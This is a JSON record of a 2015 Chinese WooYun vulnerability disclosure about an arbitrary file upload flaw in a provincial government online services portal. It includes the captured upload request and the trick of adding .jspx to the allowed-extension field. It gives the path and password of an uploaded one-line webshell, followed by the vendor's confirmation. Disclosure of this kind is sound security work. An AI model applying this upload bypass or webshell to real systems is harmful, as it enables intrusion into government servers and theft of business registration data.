{"id": 6113, "wybug_id": "wooyun-2015-0122838", "wybug_title": "某省级网上办事大厅存在任意文件上传漏洞（可能影响众多企业法人信息）", "wybug_corp": "某省级网上办事大厅", "wybug_author": "茜茜公主", "wybug_date": "2015-06-26 11:15", "wybug_open_date": "2015-08-14 13:18", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-14：\t细节向公众公开  简要描述： 任意文件上传 详细说明：  福建省网上办事大厅\n\n问题出在注册功能（法人用户注册）\n\n此处有个上传图片功能上传一张图片后抓包,可以得到以下\nPOST http://www.fjbs.gov.cn/AppFile.action?fn=upload HTTP/1.1Accept: text/*Content-Type: multipart/form-data; boundary=----------Ef1ae0ae0cH2ei4KM7gL6GI3KM7ei4User-Agent: Shockwave FlashHost: www.fjbs.gov.cnContent-Length: 662Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=72EC54DE5E80DA5D0B1BFDA78F2514F1; CNZZDATA1254004469=1094158662-1435223214-http%253A%252F%252Fwww.fjfda.gov.cn%252F%7C1435223214; JSESSIONID=72EC54DE5E80DA5D0B1BFDA78F2514F1------------Ef1ae0ae0cH2ei4KM7gL6GI3KM7ei4Content-Disposition: form-data; name=\"Filename\"u.jspx------------Ef1ae0ae0cH2ei4KM7gL6GI3KM7ei4Content-Disposition: form-data; name=\"folder\"/website/user/reg_form/------------Ef1ae0ae0cH2ei4KM7gL6GI3KM7ei4Content-Disposition: form-data; name=\"fileext\"*.gif;*.jpg;*.jpeg;*.png;------------Ef1ae0ae0cH2ei4KM7gL6GI3KM7ei4Content-Disposition: form-data; name=\"file\"; filename=\"1.jpg\"Content-Type: application/octet-streamtest------------Ef1ae0ae0cH2ei4KM7gL6GI3KM7ei4Content-Disposition: form-data; name=\"Upload\"Submit Query------------Ef1ae0ae0cH2ei4KM7gL6GI3KM7ei4--\n   漏洞证明：  对上面的数据包中的fileext进行修改，加上jspx即可（系统对jsp马有限制上传）\nContent-Disposition: form-data; name=\"fileext\"*.gif;*.jpg;*.jpeg;*.png;*.jspx;\n上传一句话\n\n上传成功后服务器会返回文件路径一句话地址：upload/80B6F7EFCC3D2930ECA8CF14497BE937_wooyun.jspx密码：woo0yun\nhttp://www.fjbs.gov.cn/upload/80B6F7EFCC3D2930ECA8CF14497BE937_wooyun.jspx\n\n\n\n\n\n\n既然是网上办事大厅，证照是必不可少\n\n\n\n\n\n\n\n\n\n文件内容多种多样\n\n\n\n\n\n\n\n等等   修复方案：  过滤   版权声明：转载请注明来源 茜茜公主@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-06-30 13:17 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给福建分中心，由福建分中心后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}